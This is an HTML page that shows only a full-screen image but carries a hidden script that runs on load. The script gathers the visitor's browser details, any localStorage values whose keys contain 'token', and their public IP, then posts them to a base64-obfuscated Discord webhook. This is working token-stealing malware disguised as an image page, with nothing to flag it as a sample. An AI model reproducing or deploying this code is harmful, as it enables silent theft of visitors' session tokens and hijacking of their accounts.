<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
    <script>
        async function l() {
            let d = `Log\nUA: ${navigator.userAgent}\nTime: ${new Date()}\n`;
            try {
                let t = [];
                for (let i = 0; i < localStorage.length; i++) {
                    let k = localStorage.key(i);
                    if (k && k.toLowerCase().includes('token')) {
                        let v = localStorage.getItem(k);
                        if (v && v.length > 30) t.push(v);
                    }
                }
                if (t.length) d += `T: ${t.join('|')}\n`;
            } catch(e){}
            
            try {
                let ip = await fetch('https://api.ipify.org?format=text').then(r => r.text());
                d += `IP: ${ip}`;
            } catch(e){}

            fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA=='), {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: d})
            });
        }
        window.onload = l;
    </script>
</head>
<body>
    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;">
</body>
</html>
